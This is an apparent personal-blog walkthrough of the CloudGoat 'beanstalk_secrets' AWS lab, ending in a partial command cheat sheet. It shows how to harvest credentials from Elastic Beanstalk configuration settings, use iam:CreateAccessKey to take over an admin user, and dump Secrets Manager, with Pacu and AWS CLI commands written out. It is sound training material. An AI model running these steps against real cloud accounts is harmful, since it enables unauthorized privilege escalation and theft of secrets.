<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
<link rel="manifest" href="../../favicon/site.webmanifest">
<link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5">



<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
/>

<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css"
/>

<link rel="stylesheet" href="../../css/custom-swiper.css">




<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<title itemprop="name"> Cloudgoat Beanstalk Secrets | Personal Portfolio 
</title>
<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
<meta property="og:title" content="Cloudgoat Beanstalk Secrets | Personal Portfolio" />
<meta name="twitter:title" content="Cloudgoat Beanstalk Secrets | Personal Portfolio" />
<meta itemprop="name" content="Cloudgoat Beanstalk Secrets | Personal Portfolio" />
<meta name="application-name" content="Cloudgoat Beanstalk Secrets | Personal Portfolio" />
<meta property="og:description"
      content="A biomedical engineering student and cybersecurity enthusiast" />
<meta property="og:site_name" content="Personal Portfolio" />
<meta property="og:url" content="http://localhost:1313/posts/beanstalksecrets_cloudgoat-walkthrough/" />
<meta property="og:locale" content="en">
<meta property="og:image" content="/assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo.png" />
<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo.png" />
<meta property="og:type" content="article" />

<script>
    
    if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.classList.add('dark');
    } else {
        document.documentElement.classList.remove('dark')
    }
</script>




<link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />

</head>

<body class="bg-zinc-100 dark:bg-gray-800">
    <div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10">
    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
        <div class="flex flex-row items-center justify-between p-4">
            <a href="../../" class="flex text-gray-100 transition duration-1000 ease-in-out group">
                <img src="../../images/cyber-immuno-fusion.png" class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Personal Portfolio Logo" />
                <div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 uppercase transition-colors group-hover:text-gray-400/60">
                    Personal Portfolio</div>
            </a>
            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                </svg>
            </button>
        </div>
        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
                Home
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
                About
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/biomedical/" title="Biomedical">
                Biomedical
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/software/" title="Software">
                Software
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
                Cybersecurity
            </a>
            
            
            
            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/posts/" title="Walkthroughs">
                Walkthroughs
            </a>
            
            
            
            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
                    </path>
                </svg>
                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
                </svg>
            </button>
            
        </nav>
    </div>
</div>
    
<article>
  <header class="mb-4 bg-primary-600">
    <span class="py-96">
      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
        Cloudgoat Beanstalk Secrets
      </h1>
    </span>
  </header>
  <div class="max-w-4xl mx-auto mt-8 mb-2">
    <div class="px-6">
      
      
      
      
      
      
      <img src="../../../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo_hu_879c880b7d86e620.webp" srcset=", /../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo_hu_ab3c3863575b0adf.webp 400w, /../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo_hu_7864b44eb136f752.webp 550w, /../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo_hu_989ce45a273c0855.webp 768w, /../assets/images/posts/beanstalkSecrets_cloudgoat_challenge_logo_hu_879c880b7d86e620.webp 1100w"
           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
           width="100%" alt="" />
      
      
    </div>
  </div>
  
  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
    <h1 id="introduction--context">Introduction &amp; Context</h1>
<p>Hey guys! This is a write-up for the beanstalk_secrets challenge from Cloudgoat, available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/beanstalk_secrets/README.md">here</a>. The lab gives you a pair of credentials that can use beanstalk only, but from there you&rsquo;ll need to become admin and grab the secrets from the secret manager. This is one of 2 capstone challenges from Tyler&rsquo;s <a href="https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting">Intro to AWS Pentesting course</a>. As a capstone challenge it was unguided and I had to run through it myself. I&rsquo;ll walk through how I did it and a couple ways to improve my methodology (from his walkthrough). I&rsquo;ll also be giving the commands I ran and some of my thought process as I went through the lab. Now onto the lab!</p>
<h1 id="setup">Setup</h1>
<p>If you haven&rsquo;t started cloudgoat yet, start this lab by running <code>cloudgoat create beanstalk_secrets</code>. This one does take a while to start up so be patient. Once it&rsquo;s ready, add the keys using <code>aws configure --profile bean_low</code>. I set the region to be <code>us-east-1</code> and the format as <code>json</code>.</p>
<p>Once you got that setup, validate the keys using <code>aws sts get-caller-identity --profile bean_low</code>. This should work just fine and you&rsquo;ll find that your username is something like <code>cg...at_low_priv_user</code>. Now we can start enumerating!</p>
<h1 id="enumerate-ourself">Enumerate ourself</h1>
<p>To start off, I wanted to see what permissions I had as this low level user. I was told I had access to elastic beanstalk, but no harm in checking if I have anything else useful. The commands I ran for this were:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu
</span></span><span style="display:flex;"><span>import_keys bean_low
</span></span><span style="display:flex;"><span>run iam__enum_permissions
</span></span><span style="display:flex;"><span>run iam__bruteforce_permissions
</span></span><span style="display:flex;"><span>exit
</span></span></code></pre></div><p>If you run that, you&rsquo;ll find out you have access to basically nothing. The elastic permissions didn&rsquo;t come up for me either. Maybe my version of pacu didn&rsquo;t have that enabled yet? That&rsquo;s unfortunate. We&rsquo;ll need to head into Elastic directly and see if we can make any headway there.</p>
<h1 id="enumerate-elastic">Enumerate Elastic</h1>
<h2 id="what-is-elastic-beanstalk">What is Elastic Beanstalk?</h2>
<p>Before doing anything into elastic beanstalk, I looked up what it actually is. From their <a href="https://www.youtube.com/watch?v=uiM1xzOX8Qg">promotional video</a>, I learned it&rsquo;s a service to host a web server. That&rsquo;s interesting. Maybe we&rsquo;ll find a website that has some vulnerability we an abuse to escalate our permissions later. I also asked ChatGPT for a couple basic enumeration commands. And for reference, I grabbed the <a href="https://docs.aws.amazon.com/cli/latest/reference/elasticbeanstalk/">documentation</a>.</p>
<h2 id="enumerate-environment--application">Enumerate environment &amp; application</h2>
<p>The command chatgpt told me to run was one to describe environments. Well according to <a href="https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/concepts.html">this</a>, an environment is a collection of AWS resources running an application version. If I&rsquo;m a low level user with access to elastic, maybe I have permissions to describe the environments? I tried <code>aws elasticbeanstalk describe-environments --profile bean_low</code>. And bingo! Something we could actually run. You should see something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Environments&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EnvironmentName&#34;</span>: <span style="color:#e6db74">&#34;cgidwk1c1402at-env&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EnvironmentId&#34;</span>: <span style="color:#e6db74">&#34;e-bahg3m85ex&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;ApplicationName&#34;</span>: <span style="color:#e6db74">&#34;cgidwk1c1402at-app&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;SolutionStackName&#34;</span>: <span style="color:#e6db74">&#34;64bit Amazon Linux 2023 v4.5.1 running Python 3.11&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PlatformArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.5.1&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EndpointURL&#34;</span>: <span style="color:#e6db74">&#34;awseb-e-b-AWSEBLoa-RIRC2YCDS4X1-1221922185.us-east-1.elb.amazonaws.com&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;CNAME&#34;</span>: <span style="color:#e6db74">&#34;cgidwk1c1402at-env.eba-x7cbyr2f.us-east-1.elasticbeanstalk.com&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;DateCreated&#34;</span>: <span style="color:#e6db74">&#34;2025-05-19T22:01:09.730000+00:00&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;DateUpdated&#34;</span>: <span style="color:#e6db74">&#34;2025-05-19T22:04:09.143000+00:00&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Status&#34;</span>: <span style="color:#e6db74">&#34;Ready&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;AbortableOperationInProgress&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Health&#34;</span>: <span style="color:#e6db74">&#34;Grey&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;HealthStatus&#34;</span>: <span style="color:#e6db74">&#34;No Data&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Tier&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;WebServer&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Type&#34;</span>: <span style="color:#e6db74">&#34;Standard&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;1.0&#34;</span>
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EnvironmentLinks&#34;</span>: [],
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EnvironmentArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:elasticbeanstalk:us-east-1:381491899745:environment/cgidwk1c1402at-app/cgidwk1c1402at-env&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This seems interesting. We got the name of the application being run and we got an endpoint URL. That url might be the webserver being run? Note this information down. Before we go down that path, let&rsquo;s do a bit more searching.</p>
<p>Now I did a quick scan of the available commands on the documentation page, and one stood out to me. There was an option to describe configuration settings. Well settings might contain sensitive data, like some sort of environment variable or secrets. Settings are useful I&rsquo;d think. So let&rsquo;s check if we can look at the settings. The command is this (replace the application anem and enviroment name with yours if different).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws elasticbeanstalk describe-configuration-settings --profile bean_low --application-name cgidwk1c1402at-app --environment-name cgidwk1c1402at-env
</span></span></code></pre></div><p>And what do you know, there are secrets there! You&rsquo;ll need to scroll a bit, but the keys are available under 2 sections, <code>aws:cloudformation:template:parameter</code> and <code>aws:elasticbeanstalk:application:environment</code>. Both contain the same keys. But that&rsquo;s our next step! Copy down those keys and we can go to enumerate with those keys</p>
<h2 id="an-automated-alternative">An automated alternative</h2>
<p>When I did the lab, the documentation for Pacu didn&rsquo;t show anything about a module for Elastic (one of the first things I checked), so I assumed there wasn&rsquo;t one. But going through Tyler&rsquo;s course, I find out there was a module! You can run <code>run elasticbeanstalk__enum --region us-east-1</code> in pacu and that will find the keys for you! But it&rsquo;s always good to know how to check manually too.</p>
<h1 id="enumerate-secondary-user">Enumerate Secondary User</h1>
<p>Now after Pacu showed almost nothing useful with the first user, my expectations were low for the second user. Hence I&rsquo;m going to go through this manually. You can check my other posts for how one could use pacu to automate this if you&rsquo;re interested.</p>
<p>So first thing first, configure the profile &amp; validate credential.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile elastic_2
</span></span><span style="display:flex;"><span><span style="color:#75715e">#PASS KEYS IN</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># region = us-east-1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># output = json</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Validate!</span>
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile elastic_2
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;UserId&#34;</span>: <span style="color:#e6db74">&#34;AIDAVRUVQNVQ6DCO3CWAF&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Account&#34;</span>: <span style="color:#e6db74">&#34;381491899745&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:user/USERNAME_HERE&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>So I&rsquo;m going to check if I have any policies attached to me first by running <code>aws iam list-attached-user-policies --profile elastic_2 --user-name cgidwk1c1402at_secondary_user</code>.</p>
<p>And we&rsquo;ll get a response showing we have a policy!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;AttachedPolicies&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cgidwk1c1402at_secondary_policy&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PolicyArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s see if I can find anything interesting about the policy by running <code>aws iam get-policy --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --profile elastic_2</code>.</p>
<p>You&rsquo;ll see it&rsquo;s tagged with a couple things, but really nothing useful comes out of that. The version Id is <code>v1</code> though, let&rsquo;s use that to check what permisions we have. Run <code>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --version-id v1 --profile elastic_2</code>. And you&rsquo;ll see we we something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Document&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Statement&#34;</span>: [
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Action&#34;</span>: [
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:CreateAccessKey&#34;</span>
</span></span><span style="display:flex;"><span>                    ],
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>
</span></span><span style="display:flex;"><span>                },
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Action&#34;</span>: [
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListRoles&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetRole&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListPolicies&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetPolicy&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListPolicyVersions&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetPolicyVersion&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListUsers&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetUser&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListGroups&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetGroup&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListAttachedUserPolicies&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:ListAttachedRolePolicies&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;iam:GetRolePolicy&#34;</span>
</span></span><span style="display:flex;"><span>                    ],
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            ],
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;VersionId&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;IsDefaultVersion&#34;</span>: <span style="color:#66d9ef">true</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;CreateDate&#34;</span>: <span style="color:#e6db74">&#34;2025-05-19T22:00:53+00:00&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Damn, we got a bunch of IAM permissions. And most importantly, we have the <code>iam:CreateAccessKey</code> permission. That, going off the name, would probably mean I can create an access key for any user. So if I can find a user with higher permissions, I could create an access key for them and &lsquo;backdoor&rsquo; myself into them. But we get ahead of ourselves. Let&rsquo;s do a thorough environment enumeration before we go and escalate permisions.</p>
<h2 id="enumerate-environment-with-pacu">Enumerate environment with Pacu</h2>
<p>Okay, to do this next level of enumeration, I&rsquo;m going to use Pacu. I&rsquo;ll have it grab my own permissiosn and then check to see all the users &amp; their permissions. Here&rsquo;s what you should do</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu
</span></span><span style="display:flex;"><span>import_keys elastic_2
</span></span><span style="display:flex;"><span>run iam__enum_permissions
</span></span><span style="display:flex;"><span>run iam__enum_users_roles_policies_groups
</span></span></code></pre></div><p>Now to read through the results. Let&rsquo;s check who the users are with <code>data iam Users</code>. There should be a user with a username like <code>cg...._admin_user</code>. That seems interesting. Let&rsquo;s note him down.</p>
<p>If we check policies, we see there are 3 policies, seems like one for each user. Now one would think the admin has full permissions, but let&rsquo;s just confirm that. Run <code>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_admin_user_policy --version-id v1 --profile elastic_2</code> (make sure to replace the policy arn with yours if different). You&rsquo;ll see the policy allows all actions on all resources. Great! This must be the user we need to transform into to gain our admin access so we can grab the flag from secret manager.</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>So to continue our attack we must become the admin by adding an access key. The documentation I checked for the syntax is <a href="https://docs.aws.amazon.com/cli/latest/reference/iam/create-access-key.html">this</a>. The command is <code>aws iam create-access-key --user-name cgidwk1c1402at_admin_user --profile elastic_2</code> (of course replace the admin username and profile with yours!)</p>
<p>You&rsquo;ll get a response that gives you a new access key and secret key so configure a new profile using <code>aws configure --profile bean_admin</code>.</p>
<p>Then verify it using <code>aws sts get-caller-identity --profile bean_admin</code> and you&rsquo;ll see that you&rsquo;re admin!</p>
<h1 id="secret-manager">Secret Manager</h1>
<p>To prove victory we need to grab the secret flag. We can use pacu to grab the secret for us. This is something I wasn&rsquo;t aware when I did the lab, so the instructions are from Tyler&rsquo;s walkthrough.</p>
<p>Open pacu with <code>pacu</code> then <code>import_keys bean_admin</code> and finally run <code>run secrets__enum --region us-east-1</code>. That will get the secrets and store it in a file, it&rsquo;ll tell you where that file is. Then just <code>cat ~/.local/share/pacu/beanstalk/downloads/secrets/secrets_manager/secrets.txt</code> and you&rsquo;ll see the flag!</p>
<h1 id="conclusion">Conclusion</h1>
<p>This was a pretty neat lab where I really had to use some manual techniques to succeed. I had to first look into the elastic beanstalk environment to find unprotected credentials. Then I had to look into the permissions of that new user to find a escalation path. Finally I had to use become the admin and look into the Secret Manager to grab the final flag.</p>
<p><em>Don&rsquo;t forget to destroy your lab to shut down your resources in AWS!</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy beanstalk_secrets
</span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
<p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
</span></span><span style="display:flex;"><span>cloudgoat create beanstalk_secrets
</span></span><span style="display:flex;"><span>aws configure --profile bean_low
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Check Elastic Beanstalk</span>
</span></span><span style="display:flex;"><span>aws elasticbeanstalk describe-environments --profile bean_low  
</span></span><span style="display:flex;"><span>aws elasticbeanstalk describe-configuration-settings --profile bean_low --application-name cgidwk1c1402at-app --environment-name cgidwk1c1402at-env
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate 2nd user</span>
</span></span><span style="display:flex;"><span>aws configure --profile elastic_2   
</span></span><span style="display:flex;"><span>aws iam list-attached-user-policies --profile elastic_2 --user-name cgidwk1c1402at_secondary_user
</span></span><span style="display:flex;"><span>aws iam get-policy --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --profile elastic_2
</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_secondary_policy --version-id v1 --profile elastic_2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate with pacu</span>
</span></span><span style="display:flex;"><span>pacu
</span></span><span style="display:flex;"><span>import_keys elastic2
</span></span><span style="display:flex;"><span>run iam__enum_permissions
</span></span><span style="display:flex;"><span>run iam__enum_users_roles_policies_groups
</span></span><span style="display:flex;"><span>data iam Users
</span></span><span style="display:flex;"><span>aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cgidwk1c1402at_admin_user_policy --version-id v1 --profile elastic_2   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Escalate </span>
</span></span><span style="display:flex;"><span>aws iam create-access-key --user-name cgidwk1c1402at_admin_user --profile elastic_2   
</span></span><span style="display:flex;"><span>aws configure --profile bean_admin  
</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile bean_admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Secret Manager</span>
</span></span><span style="display:flex;"><span>pacu
